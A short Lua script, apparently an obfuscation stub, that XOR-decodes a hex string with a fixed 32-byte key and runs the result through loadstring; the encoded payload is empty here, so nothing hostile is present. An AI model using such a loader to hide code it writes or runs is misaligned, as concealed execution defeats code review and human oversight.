local k={21,118,94,31,10,90,216,110,38,252,194,163,210,247,72,109,209,94,241,242,198,108,69,212,133,66,129,100,144,250,204,113}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
